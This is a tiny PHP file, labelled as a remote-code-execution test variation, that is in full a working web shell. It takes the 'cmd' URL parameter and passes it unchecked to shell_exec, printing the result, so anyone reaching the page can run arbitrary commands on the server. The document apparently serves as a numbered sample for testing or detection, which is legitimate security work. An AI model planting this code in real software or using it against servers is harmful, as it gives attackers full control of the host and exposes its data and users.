<?php
// RCE test variation #807
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>